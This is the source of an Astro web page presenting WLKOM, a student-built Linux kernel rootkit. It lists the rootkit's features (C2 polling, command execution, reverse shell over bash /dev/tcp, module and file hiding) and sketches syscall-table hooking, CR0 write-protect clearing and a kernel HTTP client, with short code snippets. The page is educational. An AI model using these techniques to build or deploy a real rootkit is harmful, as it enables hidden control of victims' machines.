---
import BaseHead from '../components/BaseHead.astro';
import Header from '../components/Header.astro';
import Footer from '../components/Footer.astro';
import { Image } from 'astro:assets';
import rootkitImage from '../assets/rootkit-image.png';

// ── Layout constants ──────────────────────────────────────────────
const W      = 860;
const cardW  = 100;
const cardH  = 90;
const sp     = 120; // spacing between card centers

// Row centers (x)
const r0cx = [0,1,2,3].map(i => 430 + (i - 1.5) * sp); // 250 370 490 610
const r1cx = [0,1,2  ].map(i => 430 + (i - 1  ) * sp); // 310 430 550
const r2cx = [0,1,2  ].map(i => 430 + (i - 1  ) * sp); // 310 430 550

// Y positions
const bus0 = 45;  const r0t = 75;
const bus1 = 200; const r1t = 230;
const bus2 = 355; const r2t = 385;
const VH   = r2t + cardH + 20; // 495

// ── Features ─────────────────────────────────────────────────────
const row0 = [
  { label: "Connection", sub: "& Polling",  slug: "connection",      done: true  },
  { label: "Execute",    sub: "Commands",   slug: "exec",            done: true  },
  { label: "Upload /",   sub: "Download",   slug: "upload-download", done: true  },
  { label: "Reverse",    sub: "Shell",      slug: "reverse-shell",   done: true  },
];
const row1 = [
  { label: "Hide",        sub: "Module",  slug: "hide-module",  done: true  },
  { label: "Hide",        sub: "Files",   slug: "hide-files",   done: true  },
  { label: "Hide",        sub: "Lines",   slug: "hide-lines",   done: true  },
];
const row2 = [
  { label: "Persistence", sub: "",         slug: "",           done: false },
  { label: "Password",    sub: "Auth",     slug: "",           done: false },
  { label: "Network",     sub: "Encrypt",  slug: "",           done: true  },
];

// ── Path helpers ──────────────────────────────────────────────────
const p = (busY: number, cardTopY: number, xc: number) =>
  `M430,0 L430,${busY} L${xc},${busY} L${xc},${cardTopY}`;

// row2 paths pass through bus0 AND bus1 before branching at bus2
const p2 = (xc: number) =>
  `M430,0 L430,${bus2} L${xc},${bus2} L${xc},${r2t}`;

// Duration: proportional to path length, slower speed (140 px/s)
function dur(d: string): string {
  const pts = d.match(/[\d.]+,[\d.]+/g)!.map(s => s.split(',').map(Number));
  let len = 0;
  for (let i = 1; i < pts.length; i++)
    len += Math.hypot(pts[i][0]-pts[i-1][0], pts[i][1]-pts[i-1][1]);
  return `${Math.max(2.0, len / 80).toFixed(2)}s`;
}
---

<!doctype html>
<html lang="en">
<head>
  <BaseHead title="Rootkit — WLKOM" description="WLKOM Linux kernel rootkit features." />
</head>
<body>
  <Header />
  <main>

    <div class="page-header">
      <div class="badge">Kernel module</div>
      <h1>// Rootkit (LKM)</h1>
      <p class="subtitle">A Linux Kernel Module loaded on the victim — polling, executing, transferring, hiding.</p>
    </div>

    <section class="circuit-section">

      <Image
        src={rootkitImage}
        alt="WLKOM rootkit pixel art"
        width={480}
        height={262}
        loading="eager"
        fetchpriority="high"
        style="image-rendering:pixelated;display:block;border-radius:0;margin:0 auto;"
      />

      <svg viewBox={`0 0 ${W} ${VH}`} xmlns="http://www.w3.org/2000/svg" class="tree-svg">
        <defs>
          <filter id="neon" x="-60%" y="-60%" width="220%" height="220%">
            <feGaussianBlur stdDeviation="4" result="b"/>
            <feMerge><feMergeNode in="b"/><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge>
          </filter>
          <filter id="soft" x="-50%" y="-50%" width="200%" height="200%">
            <feGaussianBlur stdDeviation="2" result="b"/>
            <feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge>
          </filter>
        </defs>

        {/* ── Trunk + buses (static dim lines) ── */}
        <line x1="430" y1="0"       x2="430" y2={bus2}       stroke="#00ff41" stroke-width="1.5" opacity="0.2"/>
        <line x1={r0cx[0]} y1={bus0} x2={r0cx[3]} y2={bus0}  stroke="#00ff41" stroke-width="1"   opacity="0.18"/>
        <line x1={r1cx[0]} y1={bus1} x2={r1cx[2]} y2={bus1}  stroke="#00ff41" stroke-width="1"   opacity="0.18"/>
        <line x1={r2cx[0]} y1={bus2} x2={r2cx[2]} y2={bus2}  stroke="#00ff41" stroke-width="1"   opacity="0.08"/>
        {r0cx.map(xc => <line x1={xc} y1={bus0} x2={xc} y2={r0t} stroke="#00ff41" stroke-width="1" opacity="0.18"/>)}
        {r1cx.map(xc => <line x1={xc} y1={bus1} x2={xc} y2={r1t} stroke="#00ff41" stroke-width="1" opacity="0.18"/>)}
        {r2cx.map(xc => <line x1={xc} y1={bus2} x2={xc} y2={r2t} stroke="#00ff41" stroke-width="1" opacity="0.07"/>)}

        {/* ── Junction dots ── */}
        <circle cx="430" cy={bus0} r="3.5" fill="#00ff41" opacity="0.6" filter="url(#soft)"/>
        <circle cx="430" cy={bus1} r="3"   fill="#00ff41" opacity="0.5" filter="url(#soft)"/>
        <circle cx="430" cy={bus2} r="2.5" fill="#00ff41" opacity="0.2"/>
        {r0cx.map(xc => <circle cx={xc} cy={bus0} r="2.5" fill="#00ff41" opacity="0.4"/>)}
        {r1cx.map(xc => <circle cx={xc} cy={bus1} r="2.5" fill="#00ff41" opacity="0.4"/>)}
        {r2cx.map(xc => <circle cx={xc} cy={bus2} r="2"   fill="#00ff41" opacity="0.15"/>)}

        {/* ── Row 0 — done ── */}
        {row0.map((f, i) => {
          const xc = r0cx[i];
          const d  = p(bus0, r0t, xc);
          const dx = dur(d);
          const dl = `${(i * 0.6).toFixed(2)}s`;
          const hasParticle = i === 0 || i === 3; // only outermost two
          return (
            <>
              <path id={`p0${i}`} d={d} stroke="none" fill="none"/>
              {hasParticle && (
                <circle r="5" fill="#00ff41" filter="url(#neon)">
                  <animateMotion dur={dx} begin={dl} repeatCount="indefinite"><mpath href={`#p0${i}`}/></animateMotion>
                </circle>
              )}
              <a href={`/features/${f.slug}`} class="feat-link">
                <rect x={xc-cardW/2} y={r0t} width={cardW} height={cardH} rx="5"
                  fill="#161b22" stroke="#00ff41" stroke-width="1" stroke-opacity="0.45" class="cr"/>
                <circle cx={xc+cardW/2-10} cy={r0t+12} r="4" fill="#00ff41" opacity="0.9"/>
                <text x={xc} y={r0t+32} text-anchor="middle" fill="#e6edf3" font-family="'Courier New',monospace" font-size="11" font-weight="bold">{f.label}</text>
                <text x={xc} y={r0t+48} text-anchor="middle" fill="#e6edf3" font-family="'Courier New',monospace" font-size="11" font-weight="bold">{f.sub}</text>
                <text x={xc} y={r0t+68} text-anchor="middle" fill="#00ff41" font-family="monospace" font-size="10" opacity="0.6">→ docs</text>
              </a>
            </>
          );
        })}

        {/* ── Row 1 — done ── */}
        {row1.map((f, i) => {
          const xc = r1cx[i];
          const d  = p(bus1, r1t, xc);
          const dx = dur(d);
          const dl = `${(i * 0.65 + 0.3).toFixed(2)}s`;
          const hasParticle = i === 1; // only center
          return (
            <>
              <path id={`p1${i}`} d={d} stroke="none" fill="none"/>
              {hasParticle && (
                <circle r="5" fill="#00ff41" filter="url(#neon)">
                  <animateMotion dur={dx} begin={dl} repeatCount="indefinite"><mpath href={`#p1${i}`}/></animateMotion>
                </circle>
              )}
              <a href={`/features/${f.slug}`} class="feat-link">
                <rect x={xc-cardW/2} y={r1t} width={cardW} height={cardH} rx="5"
                  fill="#161b22" stroke="#00ff41" stroke-width="1" stroke-opacity="0.45" class="cr"/>
                <circle cx={xc+cardW/2-10} cy={r1t+12} r="4" fill="#00ff41" opacity="0.9"/>
                <text x={xc} y={r1t+32} text-anchor="middle" fill="#e6edf3" font-family="'Courier New',monospace" font-size="11" font-weight="bold">{f.label}</text>
                <text x={xc} y={r1t+48} text-anchor="middle" fill="#e6edf3" font-family="'Courier New',monospace" font-size="11" font-weight="bold">{f.sub}</text>
                <text x={xc} y={r1t+68} text-anchor="middle" fill="#00ff41" font-family="monospace" font-size="10" opacity="0.6">→ docs</text>
              </a>
            </>
          );
        })}

        {/* ── Row 2 — mixed (done or WIP) ── */}
        {row2.map((f, i) => {
          const xc = r2cx[i];
          if (f.done) {
            return (
              <g>
                <rect x={xc-cardW/2} y={r2t} width={cardW} height={cardH} rx="5"
                  fill="#161b22" stroke="#00ff41" stroke-width="1" stroke-opacity="0.45"/>
                <circle cx={xc+cardW/2-10} cy={r2t+12} r="4" fill="#00ff41" opacity="0.9"/>
                <text x={xc} y={r2t+32} text-anchor="middle" fill="#e6edf3" font-family="'Courier New',monospace" font-size="11" font-weight="bold">{f.label}</text>
                <text x={xc} y={r2t+48} text-anchor="middle" fill="#e6edf3" font-family="'Courier New',monospace" font-size="11" font-weight="bold">{f.sub}</text>
                <text x={xc} y={r2t+68} text-anchor="middle" fill="#00ff41" font-family="monospace" font-size="10" opacity="0.6">✓ done</text>
              </g>
            );
          }
          return (
            <g opacity="0.45">
              <rect x={xc-cardW/2} y={r2t} width={cardW} height={cardH} rx="5"
                fill="#0d1117" stroke="#30363d" stroke-width="1"/>
              <circle cx={xc+cardW/2-10} cy={r2t+12} r="4" fill="#e3b341" opacity="0.7"/>
              <text x={xc} y={r2t+32} text-anchor="middle" fill="#8b949e" font-family="'Courier New',monospace" font-size="11" font-weight="bold">{f.label}</text>
              <text x={xc} y={r2t+48} text-anchor="middle" fill="#8b949e" font-family="'Courier New',monospace" font-size="11" font-weight="bold">{f.sub}</text>
              <text x={xc} y={r2t+68} text-anchor="middle" fill="#e3b341" font-family="monospace" font-size="10" opacity="0.7">⏳ WIP</text>
            </g>
          );
        })}

      </svg>
    </section>

    <!-- Module info -->
    <section class="section">
      <h2 class="section-title">// Module info</h2>
      <div class="info-grid">
        <div class="info-item"><span class="info-key">Module name</span><code>wlkom.ko</code></div>
        <div class="info-item"><span class="info-key">Language</span><code>C (kernel space)</code></div>
        <div class="info-item"><span class="info-key">Kernel target</span><code>Linux ≥ 5.0 (tested 6.6 LTS)</code></div>
        <div class="info-item"><span class="info-key">Poll interval</span><code>5 seconds</code></div>
        <div class="info-item"><span class="info-key">File transfer limit</span><code>64 KiB (FILE_BUF_SIZE)</code></div>
        <div class="info-item"><span class="info-key">UUID storage</span><code>/rootkit/uuid</code></div>
      </div>
    </section>

    <!-- What is a rootkit -->
    <section class="section">
      <h2 class="section-title">// What is a rootkit?</h2>
      <div class="prose">
        <p>
          A <strong>rootkit</strong> is a piece of software designed to gain persistent, hidden access to a
          machine — typically with the goal of keeping that access secret from the system owner and security tools.
          The term comes from the Unix world: <em>root</em> (the administrator account) + <em>kit</em> (a set of tools).
        </p>
        <p>
          WLKOM is a <strong>kernel-level rootkit</strong>, meaning it runs inside the Linux kernel itself rather
          than in userland. This gives it complete control over the system: it can intercept any system call,
          manipulate kernel data structures, and remain invisible to any process running in user space.
        </p>
        <div class="callout">
          <span class="callout-icon">⚠</span>
          <p>
            This project is strictly <strong>educational</strong>. It was built at EPITA to understand how rootkits
            operate at the kernel level. Running it on any machine without explicit authorization is illegal.
          </p>
        </div>
      </div>
    </section>

    <!-- LKM lifecycle -->
    <section class="section">
      <h2 class="section-title">// Linux Kernel Modules (LKM)</h2>
      <div class="prose">
        <p>
          A <strong>Linux Kernel Module</strong> is a piece of object code that can be loaded into a running kernel
          without rebooting. It runs in <strong>ring 0</strong> — the most privileged CPU execution level — and has
          direct access to all kernel APIs, memory, and hardware.
        </p>
        <p>Two entry points define the lifecycle of any LKM:</p>
      </div>
      <div class="code-block">
        <div class="code-header"><span>wlkom_main.c</span></div>
        <pre><code>{`static int __init wlkom_init(void) {
    hide_module();   // remove from lsmod / /proc/modules
    c2_init();       // connect to C2, start polling thread
    return 0;
}

static void __exit wlkom_exit(void) {
    c2_cleanup();    // stop polling, free resources
}

module_init(wlkom_init);
module_exit(wlkom_exit);`}</code></pre>
      </div>
      <div class="prose">
        <p>
          The module is loaded with <code>insmod wlkom.ko c2_host=&lt;IP&gt;</code> and immediately hides itself,
          making it invisible in <code>lsmod</code> or <code>/proc/modules</code>. It then spawns a kernel thread
          that periodically contacts the C2 server.
        </p>
      </div>
    </section>

    <!-- HTTP in kernel space -->
    <section class="section">
      <h2 class="section-title">// HTTP in kernel space</h2>
      <div class="prose">
        <p>
          One of the biggest challenges of this project is implementing an <strong>HTTP client from scratch in
          the Linux kernel</strong>. There is no standard library, no libc, no <code>curl</code>. Instead, we use
          the kernel's own <strong>socket API</strong> (<code>sock_create</code>, <code>kernel_connect</code>,
          <code>kernel_sendmsg</code>, <code>kernel_recvmsg</code>) to open a raw TCP connection and hand-write
          HTTP/1.0 requests as byte strings.
        </p>
        <p>Why <strong>HTTP/1.0</strong> and not 1.1?</p>
        <ul>
          <li>HTTP/1.0 closes the connection after each request — no need to manage persistent connections or chunked transfer encoding.</li>
          <li>There is no <code>Transfer-Encoding: chunked</code> to parse.</li>
          <li>Each response ends when the server closes the socket — simple to detect.</li>
        </ul>
      </div>
      <div class="code-block">
        <div class="code-header"><span>c2.c — HTTP GET (simplified)</span></div>
        <pre><code>{`// Build raw HTTP/1.0 request
snprintf(buf, sizeof(buf),
    "GET %s HTTP/1.0\\r\\n"
    "Host: %s\\r\\n"
    "Connection: close\\r\\n"
    "\\r\\n", path, c2_host);

// Send over kernel TCP socket
kvec.iov_base = buf;
kvec.iov_len  = strlen(buf);
kernel_sendmsg(sock, &msg, &kvec, 1, kvec.iov_len);`}</code></pre>
      </div>
    </section>

    <!-- Syscall hooking -->
    <section class="section">
      <h2 class="section-title">// Syscall hooking</h2>
      <div class="prose">
        <p>
          Linux exposes a <strong>syscall table</strong> — an array of function pointers, one per system call
          number. To intercept a syscall, the rootkit replaces the function pointer in this table with its own
          handler, calls the original underneath, then filters the result.
        </p>
        <p>
          Two calls are hooked in WLKOM:
        </p>
        <div class="feat-cards-prose">
          <div class="fcp">
            <code>getdents64</code>
            <p>Called by <code>ls</code>, <code>find</code>, and any directory listing. The hook iterates the
            returned directory entries and removes any entry whose name matches the rootkit directory
            (<code>/rootkit</code>). From userland, the directory simply does not exist.</p>
          </div>
          <div class="fcp">
            <code>read()</code>
            <p>Called whenever a process reads a file. The hook scans the returned buffer for lines containing
            a target string (e.g. the module name) and splices them out before returning to the caller.
            This is how the rootkit hides its entry from <code>/proc/modules</code> even if seen via <code>cat</code>.</p>
          </div>
        </div>
        <p>
          The syscall table is normally read-only. To write to it, the rootkit temporarily clears the
          <strong>WP (Write Protect) bit</strong> in the CR0 control register, patches the pointer, then
          restores WP.
        </p>
      </div>
    </section>

    <!-- Source tree -->
    <section class="section">
      <h2 class="section-title">// Source tree</h2>
      <div class="file-tree">
        <div class="ft-row"><span class="ft-path">rootkit/src/</span></div>
        <div class="ft-row"><span class="ft-file">wlkom_main.c</span><span class="ft-desc">Module init/exit — calls hide_module() then c2_init()</span></div>
        <div class="ft-row"><span class="ft-file">c2.c</span><span class="ft-desc">HTTP client, UUID registration, action polling, result posting, file transfer</span></div>
        <div class="ft-row"><span class="ft-file">exec.c</span><span class="ft-desc">Command execution via call_usermodehelper(), reverse shell via bash /dev/tcp</span></div>
        <div class="ft-row"><span class="ft-file">hide.c</span><span class="ft-desc">Removes the module from lsmod, /proc/modules and /sys/module/ on load</span></div>
        <div class="ft-row"><span class="ft-file">utils.c</span><span class="ft-desc">Kernel file I/O helpers: read_file() and write_file() using VFS</span></div>
        <div class="ft-row"><span class="ft-file">hook.c</span><span class="ft-desc">Syscall table hooking: getdents64 (hide files) and read() (hide lines)</span></div>
      </div>
    </section>

  </main>
  <Footer />
</body>
</html>

<style>
.page-header {
  padding: 3em 0 2em;
  border-bottom: 1px solid var(--border);
  margin-bottom: 2.5em;
}
.badge {
  display: inline-block;
  font-family: 'Courier New', monospace;
  font-size: 0.75em;
  color: var(--accent);
  border: 1px solid var(--accent);
  padding: 3px 10px;
  border-radius: 3px;
  letter-spacing: 2px;
  margin-bottom: 1em;
  text-transform: uppercase;
}
h1 { font-size: 2.4em; margin-bottom: 0.3em; }
.subtitle { color: var(--muted); font-size: 1em; margin: 0; }

.circuit-section { margin-bottom: 4em; }

.tree-svg { width: 100%; height: auto; display: block; }

.feat-link .cr { transition: stroke-opacity 0.2s; }
.feat-link:hover .cr { stroke-opacity: 1 !important; }

/* ── Educational sections ── */
.section { margin-bottom: 4em; }
.section-title {
  font-family: 'Courier New', monospace;
  font-size: 0.9em;
  color: var(--accent);
  letter-spacing: 2px;
  text-transform: uppercase;
  margin-bottom: 1em;
}
.info-grid {
  display: grid;
  grid-template-columns: 1fr 1fr 1fr;
  gap: 1px;
  border: 1px solid var(--border);
  border-radius: 8px;
  overflow: hidden;
}
.info-item {
  background: var(--surface);
  padding: 0.9em 1.2em;
  display: flex;
  flex-direction: column;
  gap: 0.3em;
  border-right: 1px solid var(--border);
  border-bottom: 1px solid var(--border);
}
.info-key {
  font-family: 'Courier New', monospace;
  font-size: 0.7em;
  color: var(--muted);
  letter-spacing: 1px;
  text-transform: uppercase;
}
.info-item code {
  font-size: 0.88em;
  color: var(--accent);
  background: none;
  border: none;
  padding: 0;
}
/* prose */
.prose { color: var(--muted); font-size: 0.92em; line-height: 1.75; }
.prose + .prose { margin-top: 1em; }
.prose p { margin-bottom: 0.9em; }
.prose p:last-child { margin-bottom: 0; }
.prose strong { color: var(--text); font-weight: 600; }
.prose em { color: var(--accent); font-style: normal; }
.prose code { font-family: 'Courier New', monospace; font-size: 0.88em; color: var(--accent); background: rgba(0,255,65,0.07); padding: 1px 5px; border-radius: 3px; }
.prose ul { padding-left: 1.4em; margin-bottom: 0.9em; }
.prose li { margin-bottom: 0.4em; }

/* callout */
.callout {
  display: flex;
  gap: 0.8em;
  align-items: flex-start;
  background: rgba(227,179,65,0.07);
  border: 1px solid rgba(227,179,65,0.3);
  border-radius: 6px;
  padding: 0.9em 1em;
  margin-top: 1.2em;
}
.callout-icon { font-size: 1em; color: var(--yellow); flex-shrink: 0; padding-top: 2px; }
.callout p { color: var(--muted); font-size: 0.88em; margin: 0; line-height: 1.6; }
.callout strong { color: var(--yellow); }

/* code block */
.code-block {
  background: #010409;
  border: 1px solid var(--border);
  border-radius: 8px;
  overflow: hidden;
  margin: 1.2em 0;
  font-size: 0.85em;
}
.code-header {
  background: var(--surface);
  border-bottom: 1px solid var(--border);
  padding: 0.4em 1em;
  font-family: 'Courier New', monospace;
  font-size: 0.8em;
  color: var(--muted);
}
.code-block pre { margin: 0; padding: 1em 1.2em; overflow-x: auto; }
.code-block code { font-family: 'Courier New', monospace; color: #a5d6ff; line-height: 1.6; }

/* feature cards in prose */
.feat-cards-prose {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 1em;
  margin: 1em 0;
}
.fcp {
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 6px;
  padding: 1em;
}
.fcp code {
  display: block;
  font-family: 'Courier New', monospace;
  font-size: 0.85em;
  color: var(--accent);
  margin-bottom: 0.5em;
}
.fcp p { color: var(--muted); font-size: 0.82em; margin: 0; line-height: 1.55; }

/* file tree */
.file-tree {
  background: #010409;
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 1em 1.2em;
  font-family: 'Courier New', monospace;
  font-size: 0.85em;
}
.ft-row {
  display: flex;
  gap: 1.5em;
  padding: 0.3em 0;
  border-bottom: 1px solid rgba(48,54,61,0.4);
}
.ft-row:last-child { border-bottom: none; }
.ft-path { color: var(--accent); opacity: 0.7; }
.ft-file { color: var(--accent); min-width: 160px; flex-shrink: 0; }
